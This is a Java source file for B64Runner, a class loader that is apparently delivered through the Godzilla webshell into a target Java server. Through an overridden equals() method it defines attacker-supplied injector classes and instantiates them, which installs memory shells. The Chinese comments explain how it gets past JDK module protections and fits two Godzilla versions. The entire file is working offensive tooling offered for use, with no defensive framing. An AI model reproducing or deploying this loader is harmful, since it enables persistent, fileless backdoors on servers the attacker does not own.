package com.reajason.javaweb.godzilla;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * 下发到目标 JVM 的装载器。
 *
 * <p>Godzilla 的 JavaDynamicPayload 对 include 进来的类只会做三件事：
 * {@code newInstance()}、{@code equals(parameterMap)}、{@code toString()}，
 * 然后把 {@code parameterMap} 里的 {@code result} 原样回传。因此装载逻辑放在
 * {@link #equals(Object)} 里：参数表里的 p1/p2/p3 就是内嵌类清单、注入器字节、注入器类名。
 *
 * <p>为什么继承 {@link ClassLoader}：注入器模板可能存在匿名内部类，必须和主类定义在同一个
 * 类加载器里。继承 ClassLoader 后可以直接调用 protected 的
 * {@link ClassLoader#defineClass(String, byte[], int, int)}，不需要反射 setAccessible，
 * 也就不受 JDK 9+ 模块强封装影响（sun.misc.Unsafe.defineClass 在 JDK 11 已被移除）。
 *
 * <p>4.01 的 include 会用 Javassist 重命名本类，4.15 不会；两种情况都不能依赖自身类名：
 * 父加载器从线程上下文取，类名只用于日志/返回信息。
 */
public class B64Runner extends ClassLoader {

    static final String ERROR_PREFIX = "MemShellPartyError: ";

    private static final String PARAM_INNER = "p1";
    private static final String PARAM_MAIN = "p2";
    private static final String PARAM_MAIN_NAME = "p3";
    private static final String PARAM_RESULT = "result";

    private final Map<String, byte[]> innerClasses = new HashMap<String, byte[]>();

    public B64Runner() {
        super(contextClassLoader());
    }

    private static ClassLoader contextClassLoader() {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        return loader != null ? loader : ClassLoader.getSystemClassLoader();
    }

    @Override
    @SuppressWarnings("rawtypes")
    public boolean equals(Object obj) {
        if (!(obj instanceof Map)) {
            return false;
        }
        Map parameters = (Map) obj;
        try {
            byte[] mainBytes = (byte[]) parameters.get(PARAM_MAIN);
            byte[] nameBytes = (byte[]) parameters.get(PARAM_MAIN_NAME);
            if (mainBytes == null || nameBytes == null) {
                throw new IllegalArgumentException("missing p2/p3");
            }
            defineInnerClasses((byte[]) parameters.get(PARAM_INNER));
            String mainClassName = new String(nameBytes, "UTF-8");
            Class<?> mainClass = defineClass(mainClassName, mainBytes, 0, mainBytes.length);
            // 注入器模板的构造器即注入入口（staticInitialize 时静态块也会触发，模板内有 ok 幂等保护）
            Object instance = mainClass.newInstance();
            parameters.put(PARAM_RESULT, toBytes(describeResult(mainClass, instance)));
            return true;
        } catch (Throwable t) {
            parameters.put(PARAM_RESULT, toBytes(ERROR_PREFIX + describe(t)));
            return true;
        }
    }

    @Override
    public String toString() {
        return "";
    }

    /**
     * 兼容走「按方法名调用」协议的宿主（目标侧会优先找 {@code run(Map)}）。
     * 当前 4.01/4.15 在没有 invokeMethod 参数时走 {@link #equals(Object)} 回退分支，
     * 保留这个方法不改变现有行为，只是让协议向前兼容。
     */
    @SuppressWarnings("rawtypes")
    public byte[] run(Map parameters) {
        equals(parameters);
        Object result = parameters.get(PARAM_RESULT);
        return result instanceof byte[] ? (byte[]) result : new byte[0];
    }

    /**
     * p1 格式：int 条目数，随后每条为 int 类名长度 + UTF-8 类名 + int 字节长度 + class 字节。
     * 直接传原始字节，不走 Base64，避免大注入器把请求体再放大三分之一。
     */
    private void defineInnerClasses(byte[] data) throws Exception {
        if (data == null || data.length == 0) {
            return;
        }
        DataInputStream in = new DataInputStream(new ByteArrayInputStream(data));
        int count = in.readInt();
        for (int i = 0; i < count; i++) {
            int nameLength = in.readInt();
            byte[] nameBytes = new byte[nameLength];
            in.readFully(nameBytes);
            int classLength = in.readInt();
            byte[] classBytes = new byte[classLength];
            in.readFully(classBytes);
            innerClasses.put(new String(nameBytes, "UTF-8"), classBytes);
        }
        for (String className : innerClasses.keySet()) {
            loadClass(className);
        }
    }

    // 下发类之间可互相引用；仅对这批类子优先解析，避免父加载器先绑定后再重复定义。
    @Override
    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
        if (!innerClasses.containsKey(name)) {
            return super.loadClass(name, resolve);
        }
        synchronized (getClassLoadingLock(name)) {
            Class<?> type = findLoadedClass(name);
            if (type == null) {
                type = findClass(name);
            }
            if (resolve) {
                resolveClass(type);
            }
            return type;
        }
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        byte[] bytes = innerClasses.get(name);
        if (bytes == null) {
            throw new ClassNotFoundException(name);
        }
        return defineClass(name, bytes, 0, bytes.length);
    }

    /**
     * 优先读模板里累积的 {@code private static String msg}（大部分注入器都有），
     * 其次用重写过的 toString()；两者都没有时返回固定文案，避免把 Object@hash 当成注入结果。
     */
    private static String describeResult(Class<?> mainClass, Object instance) {
        String message = readStaticMessage(mainClass);
        if (message != null && message.trim().length() > 0) {
            return message;
        }
        String text = String.valueOf(instance);
        if (text == null || text.startsWith(mainClass.getName() + "@")) {
            return "injector executed";
        }
        return text;
    }

    private static String readStaticMessage(Class<?> type) {
        try {
            Field field = type.getDeclaredField("msg");
            field.setAccessible(true);
            Object value = field.get(null);
            return value == null ? null : value.toString();
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String describe(Throwable t) {
        String message = t.getMessage();
        if (message == null || message.trim().length() == 0) {
            return t.getClass().getName();
        }
        return t.getClass().getName() + ": " + message;
    }

    private static byte[] toBytes(String text) {
        if (text == null) {
            text = "";
        }
        try {
            return text.getBytes("UTF-8");
        } catch (Exception ignored) {
            return new byte[0];
        }
    }
}
